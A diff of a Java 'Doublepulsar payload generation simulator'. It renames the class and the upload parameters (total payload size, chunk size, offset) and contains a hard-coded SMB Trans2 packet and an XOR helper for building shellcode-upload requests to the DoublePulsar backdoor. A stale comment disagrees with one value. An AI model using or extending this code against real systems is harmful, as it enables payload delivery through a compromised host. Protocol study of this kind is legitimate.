@@ -8,16 +8,17 @@ import java.io.UnsupportedEncodingException;
 Doublepulsar payload generation simulator
 */
 
-public class Main {
+public class DoublepulsarUploadShellcode {
     
     public static byte[] trans2_exec = new byte[] {
+
         (byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0xff,(byte)0x53,(byte)0x4d,(byte)0x42,(byte)0x32,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x18,(byte)0x07,(byte)0xc0,
         (byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x08,(byte)0xff,(byte)0xfe,
         (byte)0x00,(byte)0x08,(byte)0x42,(byte)0x00,(byte)0x0f,(byte)0x0c,(byte)0x00,(byte)0x00,(byte)0x10,(byte)0x01,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,
         (byte)0x00,(byte)0x25,(byte)0x89,(byte)0x1a,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x0c,(byte)0x00,(byte)0x42,(byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0x00,(byte)0x01,
         (byte)0x00,(byte)0x0e,(byte)0x00,(byte)0x0d,(byte)0x10,(byte)0x00 
     };
-    
+        
     public static byte[] byteXor(byte[] data, byte[] keyBytes) {
     byte[] result = new byte[data.length];
     int keyLength = keyBytes.length;
@@ -131,27 +132,27 @@ public class Main {
         
         byte[] Parameters = new byte[12];
 
-        int firstValue = 0x507308; // 0x50D800
-        int secondValue = 4096;
-        int thirdValue = 0;
+        int TotalSizeOfPayload = 4096; // 0x50D800
+        int ChunkSize = 4096;
+        int OffsetInPayload = 0;
 
-        // Manually place firstValue in little-endian
-        Parameters[0] = (byte) (firstValue);
-        Parameters[1] = (byte) ((firstValue >> 8) & 0xFF);
-        Parameters[2] = (byte) ((firstValue >> 16) & 0xFF);
-        Parameters[3] = (byte) ((firstValue >> 24) & 0xFF);
+        // Manually place TotalSizeOfPayload in little-endian
+        Parameters[0] = (byte) (TotalSizeOfPayload);
+        Parameters[1] = (byte) ((TotalSizeOfPayload >> 8) & 0xFF);
+        Parameters[2] = (byte) ((TotalSizeOfPayload >> 16) & 0xFF);
+        Parameters[3] = (byte) ((TotalSizeOfPayload >> 24) & 0xFF);
 
-        // Manually place secondValue in little-endian
-        Parameters[4] = (byte) (secondValue);
-        Parameters[5] = (byte) ((secondValue >> 8) & 0xFF);
-        Parameters[6] = (byte) ((secondValue >> 16) & 0xFF);
-        Parameters[7] = (byte) ((secondValue >> 24) & 0xFF);
+        // Manually place ChunkSize in little-endian
+        Parameters[4] = (byte) (ChunkSize);
+        Parameters[5] = (byte) ((ChunkSize >> 8) & 0xFF);
+        Parameters[6] = (byte) ((ChunkSize >> 16) & 0xFF);
+        Parameters[7] = (byte) ((ChunkSize >> 24) & 0xFF);
 
-        // Manually place thirdValue in little-endian
-        Parameters[8] = (byte) (thirdValue);
-        Parameters[9] = (byte) ((thirdValue >> 8) & 0xFF);
-        Parameters[10] = (byte) ((thirdValue >> 16) & 0xFF);
-        Parameters[11] = (byte) ((thirdValue >> 24) & 0xFF);
+        // Manually place OffsetInPayload in little-endian
+        Parameters[8] = (byte) (OffsetInPayload);
+        Parameters[9] = (byte) ((OffsetInPayload >> 8) & 0xFF);
+        Parameters[10] = (byte) ((OffsetInPayload >> 16) & 0xFF);
+        Parameters[11] = (byte) ((OffsetInPayload >> 24) & 0xFF);
         
         System.out.printf("SMB Parameters:  ");
         // Print the byte array in hex to verify
